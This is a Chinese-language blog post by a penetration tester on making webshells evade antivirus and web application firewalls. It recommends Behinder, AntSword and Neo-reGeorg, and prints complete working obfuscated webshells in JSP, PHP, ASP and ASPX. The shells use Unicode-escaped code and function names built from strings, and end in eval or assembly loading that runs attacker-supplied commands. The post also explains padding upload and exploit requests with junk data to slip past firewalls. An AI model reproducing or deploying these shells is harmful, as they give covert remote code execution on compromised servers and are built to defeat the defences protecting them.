---
layout:     post
title:      闲谈webshell实战应用
subtitle:   
date:       2020-05-10
author:     volcanohatred
header-img: img/articles/webshell/title.jpg
catalog: true
tags:
    - 免杀
    
---

文件上传漏洞是渗透测试中很常见的漏洞之一，也是我们攻防演练或者渗透测试中快速getshell的一种途径，当然发现文件漏洞并不一定能成功getshell，真实环境下必不可少会存在waf或者其他拦截设备，阻碍我们成功打进目标。这篇文章就聊聊我平时渗透测试中经常使用的webshell免杀方法。
##  动态免杀
### 流量加密webshell
#### 冰蝎和蚁剑
平时渗透测试中经常使用的就是冰蝎和蚁剑，对于我来说用的冰蝎多一点，冰蝎刚开始的时候免杀效果特别好，但是随着使用人数越来越多，已经被可以被很多waf识别并拦截，冰蝎项目地址：  
<https://github.com/rebeyond/Behinder>  
除了冰蝎，另外一个就是蚁剑了，蚁剑是一款开源的跨平台网站管理工具，因为开源，相对来说可玩性很高，可以自定义加密方式，可以做任何修改，也是很多安全行业从业者特别喜欢的一款工具：
<https://github.com/AntSwordProject/AntSword-Loader>  
具体的一些使用我贴一些大佬写的文章，在这里就不造轮子了：  
[从0到1打造一款堪称完美antSword(蚁剑)]<https://xz.aliyun.com/t/6701>  
[蚁剑改造计划之实现JSP一句话]<https://xz.aliyun.com/t/7491>
#### tunnel流量  
tunnel也是我们拿下shell挂正向代理常用的工具之一(也就是我们常说的reGeorg)，但是目前来说，原始版确实很容易被检测出流量，从而被拦截。现在我会经常使用Neo-reGeorg：  
<https://github.com/L-codes/Neo-reGeorg>
这是L-codes大佬重构reGeorg的项目，对reGeorg的流量进行加密，并且还可以伪造目标404页面，确实很好用。
##  静态免杀
### 各语言脚本免杀方法
静态免杀相对于动态免杀而言也是显得尤为重要，一方面静态免杀可以躲避被查杀工具发现，更重要的是在webshell上传时，可以绕过waf对于webshell内容的检测，这一点特别关键。对于静态免杀，免杀思路也是特别灵活的，可以根据各个语言的特性来进行免杀，就用冰蝎举个例子：  
冰蝎的静态免杀处理  
#### jsp木马：  
jsp脚本可以使用unicode编码的方式来进行绕过静态查杀，比如之前碰到的jsp小马：  
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 上午11.18.09.png)
既然jsp小马可以通过这种方式进行免杀，冰蝎也可以：  
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 上午11.54.47.png)
但是冰蝎不能像jsp小马那样直接全部unicode编码，而是需要部分编码，经过多次测试，发现在内容代码处，只要函数参数值不进行编码，冰蝎就可以正常使用：
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/WechatIMG5.png)
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 上午11.51.01.png)
另外有时在webshell上传时，有的waf也会对导入的java包名称进行检测，比如javax、java、crypto这些关键字，同理我们也可以进行unicode编码，只不过中间的点号不能编码，最终形式如下：

```jsp
<%@page import="\u006a\u0061\u0076\u0061.util.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.*"%>
<%\u0063\u006c\u0061\u0073\u0073\u0020\u0055\u0020\u0065\u0078\u0074\u0065\u006e\u0064\u0073\u0020\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u007b\u0055\u0028\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0020\u0063\u0029\u007b\u0073\u0075\u0070\u0065\u0072\u0028\u0063\u0029\u003b\u007d\u0070\u0075\u0062\u006c\u0069\u0063\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0067\u0028\u0062\u0079\u0074\u0065\u0020\u005b\u005d\u0062\u0029\u007b\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0073\u0075\u0070\u0065\u0072\u002e\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073\u0028\u0062\u002c\u0030\u002c\u0062\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u003b\u007d\u007d
%>
<%\u0069\u0066\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028"pass"\u0029\u0021\u003d\u006e\u0075\u006c\u006c\u0029{\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u006b=\u0028""\u002b\u0055\u0055\u0049\u0044\u002e\u0072\u0061\u006e\u0064\u006f\u006d\u0055\u0055\u0049\u0044\u0028\u0029\u0029\u002e\u0072\u0065\u0070\u006c\u0061\u0063\u0065\u0028"-",""\u0029\u002e\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067\u002816\u0029;\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u002e\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065\u0028"u",k\u0029\u003b\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u0028\u006b\u0029\u003b\u0072\u0065\u0074\u0075\u0072\u006e\u003b}\u0043\u0069\u0070\u0068\u0065\u0072\u0020\u0063\u003d\u0043\u0069\u0070\u0068\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028"AES"\u0029;\u0063\u002e\u0069\u006e\u0069\u0074\u00282,\u006e\u0065\u0077\u0020\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063\u0028\u0028\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u002e\u0067\u0065\u0074\u0056\u0061\u006c\u0075\u0065\u0028"u"\u0029\u002b""\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0029\u002c"AES"\u0029\u0029;\u006e\u0065\u0077\u0020\u0055\u0028\u0074\u0068\u0069\u0073\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0028\u0029\u0029\u002e\u0067\u0028\u0063\u002e\u0064\u006f\u0046\u0069\u006e\u0061\u006c\u0028\u006e\u0065\u0077\u0020\u0073\u0075\u006e\u002e\u006d\u0069\u0073\u0063\u002e\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0052\u0065\u0061\u0064\u0065\u0072\u0028\u0029\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u0029\u0029\u0029\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0029\u003b%>
```
#### php木马：  
对于php木马的改造，我们需要用到php函数的一个特性：就是php是将函数以string形式传递，我们查看php手册：
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 下午12.05.39.png)
意思就是我们除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()外，其他函数变成字符串也会被当作函数执行，举个栗子：
像冰蝎php脚本里面的敏感语句：

```php
    	$post=file_get_contents("php://input");
```
其实和下面这种写法是等价的：

```php
    	$post="file_get_contents"("php://input");
```
那既然如此，我们可以编写一个字符解码函数，将加密的字符串传入其中然后让它返回解密后的字符串不就可以完美解决问题，我为了和jsp木马看起来统一，就写一个unicode解码函数，然后将敏感函数加密后传入其中即可（理论上什么解密函数都行）：

```php
<?php
@error_reporting(0);
session_start();

//unicode解码函数
function xx($unicode_str){
    $json = '{"str":"'.$unicode_str.'"}';
    $arr = json_decode($json,true);
    if(empty($arr)) return '';
    return $arr['str'];
}

if (isset($_GET['pass']))
{
    //调用解码函数返回原函数字符串
    $key=xx("\u0073\u0075\u0062\u0073\u0074\u0072")(xx("\u006d\u0064\u0035")(xx("\u0075\u006e\u0069\u0071\u0069\u0064")(xx("\u0072\u0061\u006e\u0064")())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$post=xx("\u0066\u0069\u006c\u0065\u005f\u0067\u0065\u0074\u005f\u0063\u006f\u006e\u0074\u0065\u006e\u0074\u0073")(xx("\u0070\u0068\u0070\u003a\u002f\u002f\u0069\u006e\u0070\u0075\u0074"));
	if(!xx("\u0065\u0078\u0074\u0065\u006e\u0073\u0069\u006f\u006e\u005f\u006c\u006f\u0061\u0064\u0065\u0064")('openssl'))
	{
		$t=xx("\u0062\u0061\u0073\u0065\u0036\u0034\u005f").xx("\u0064\u0065\u0063\u006f\u0064\u0065");

		$post=$t($post."");
		
		for($i=0;$i<xx("\u0073\u0074\u0072\u006c\u0065\u006e")($post);$i++) {

    			 $post[$i] = $post[$i]^$key[$i+1&15]; 

    			}
	}
	else
	{
		$post=xx("\u006f\u0070\u0065\u006e\u0073\u0073\u006c\u005f\u0064\u0065\u0063\u0072\u0079\u0070\u0074")($post,xx("\u0041\u0045\u0053\u0031\u0032\u0038"), $key);
	}
    $arr=xx("\u0065\u0078\u0070\u006c\u006f\u0064\u0065")('|',$post);

    $func=$arr[0];

    $params=$arr[1];

	class C{public function __invoke($p) {eval($p."");}}
    @xx("\u0063\u0061\u006c\u006c\u005f\u0075\u0073\u0065\u0072\u005f\u0066\u0075\u006e\u0063")(new C(),$params);
}
?>
```
我只是部分进行了改变，这样已经完全可以进行静态免杀了，当然大家也可以进一步细化。
#### asp木马：  
asp语法单一，在免杀方面确实没有什么比较好的方式，当然我们也同样可以利用asp函数的特性来进行随意变换以达到免杀的目的，比如冰蝎asp木马里面的execute(result)语句，我们可以把execute(result)变成eval("execute(result)")，因为在asp里面，像eval和execute，会把字符串当作表达式来执行，而且使用eval嵌套execute也是可行的。当然我们可以进一步，创建一个数组，用来组合免杀。为了和别的脚本统一，我还是使用unicode进行脚本改写：

```asp
<% 
function xx(str) 
    str=replace(str,"\u","")
    xx=""
    dim i
    for i=1 to len(str) step 4
        xx=xx & ChrW(cint("&H" & mid(str,i,4)))
    next
end function
Response.CharSet = "UTF-8" 
If Request.ServerVariables("REQUEST_METHOD")="GET" And Request.QueryString("pass") Then
For a=1 To 8
RANDOMIZE
k=Hex((255-17)*rnd+16)+k
Next
Session("k")=k
response.write(k)
Else
k=Session("k")
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
dim a(5)
a(0)=xx("\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u0029")
eval(a(0))
End If
%>
```
#### aspx木马： 
aspx当然也有免杀方法，aspx的免杀可以类似jsp，因为对于aspx脚本，将里面的函数进行unicode编码也是可以运行的，当然比jsp更好的是aspx对于函数参数的编码也能运行：

```aspx
<%@ Page Language="C#" %>
<%@Import Namespace="\u0053\u0079\u0073\u0074\u0065\u006d.\u0052\u0065\u0066\u006c\u0065\u0063\u0074\u0069\u006f\u006e"%>
<%if (\u0052\u0065\u0071\u0075\u0065\u0073\u0074["\u0070\u0061\u0073\u0073"]!=null){ \u0053\u0065\u0073\u0073\u0069\u006f\u006e.\u0041\u0064\u0064("\u006b", Guid.NewGuid().ToString().\u0052\u0065\u0070\u006c\u0061\u0063\u0065("-", "").\u0053\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(16)); \u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065.Write(Session[0]); return;}byte[] k = \u0045\u006e\u0063\u006f\u0064\u0069\u006e\u0067.Default.GetBytes(Session[0] + ""),c = \u0052\u0065\u0071\u0075\u0065\u0073\u0074.\u0042\u0069\u006e\u0061\u0072\u0079\u0052\u0065\u0061\u0064(\u0052\u0065\u0071\u0075\u0065\u0073\u0074.\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u004c\u0065\u006e\u0067\u0074\u0068);\u0041\u0073\u0073\u0065\u006d\u0062\u006c\u0079.\u004c\u006f\u0061\u0064(new \u0053\u0079\u0073\u0074\u0065\u006d.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006f\u0067\u0072\u0061\u0070\u0068\u0079.\u0052\u0069\u006a\u006e\u0064\u0061\u0065\u006c\u004d\u0061\u006e\u0061\u0067\u0065\u0064().\u0043\u0072\u0065\u0061\u0074\u0065\u0044\u0065\u0063\u0072\u0079\u0070\u0074\u006f\u0072(k, k).\u0054\u0072\u0061\u006e\u0073\u0066\u006f\u0072\u006d\u0046\u0069\u006e\u0061\u006c\u0042\u006c\u006f\u0063\u006b(c, 0, c.Length)).\u0043\u0072\u0065\u0061\u0074\u0065\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("U").\u0045\u0071\u0075\u0061\u006c\u0073(this);%>
```
如上面代码所述，我只是随便找了几个函数进行了unicode编码，大家可以进一步细化。当然对于里面的括号、点号不能进行编码。
最后用d盾扫下：  
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/图片 1.png)
#### tunnel的免杀
tunnel的静态免杀可以结合上面所说的冰蝎免杀方法进行制作，当然如果改动的是前面动态免杀的tunnel脚本那就更好了，这里不多介绍，之前对jsp版本的tunnel进行过改动，也是通过unicode的方式进行：
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 下午7.58.22.png)

##  上传组合招
### 数据填充
webshell上传时，通过我们对前面提到的一些静态免杀可以成功绕过很多waf，但是也不代表能绕过所有waf，这个时候怎么办呢？我们可以使用一些组合招。  
众所周知，waf层进行绕waf是最好的办法，实战中通过给交互的数据包填充大量垃圾数据能有效的过waf,因为waf为了不能影响正常业务，肯定不会对特别大的数据包进行完整识别，只是取数据包的前一部分，比如在文件上传时，单纯的静态免杀不能绕过waf，我们可以使用垃圾数据填充+静态免杀脚本进行绕过：
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/WechatIMG7.png)
这里的交互数据包可以是文件上传的数据包，当然也可以是sql注入的数据包，更可以是其他漏洞exp的数据包，比如之前weblogic的发序列化远程代码执行，也可以通过在数据包中添加大量垃圾字符来绕过waf。
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 下午5.21.01.png)
![avatar](/Users/volcano/GitHub/volcanohatred.github.io/img/articles/webshell免杀/截屏2020-05-18 下午5.21.09.png)

### +—
